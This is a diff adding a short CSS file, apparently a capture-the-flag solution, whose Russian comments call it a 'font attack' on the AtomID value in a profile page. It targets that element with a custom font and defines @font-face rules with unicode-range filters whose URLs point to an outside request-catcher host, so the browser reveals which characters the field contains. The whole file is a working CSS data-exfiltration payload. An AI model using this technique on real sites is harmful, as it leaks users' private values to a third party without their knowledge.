@@ -1,0 +1,22 @@
+@charset "UTF-8";
+
+/* Точная цель: 4-я строка профиля → это AtomID */
+.profile-info .profile-row:nth-child(4) .value {
+    font-family: flag !important;
+    font-size: 16px;
+    display: inline;
+}
+
+/* Фонтовая атака — шрифты для разных символов в значении AtomID */
+
+@font-face {
+    font-family: flag;
+    src: url("https://css_task_test.requestcatcher.com/flag?vka%7B");
+    unicode-range: U+0076; /* 'v' */
+}
+
+@font-face {
+    font-family: flag;
+    src: url("https://css_task_test.requestcatcher.com/flag?ghost");
+    unicode-range: U+0067-0068, U+006F, U+0073, U+0074; /* 'g', 'h', 'o', 's', 't' */
+}
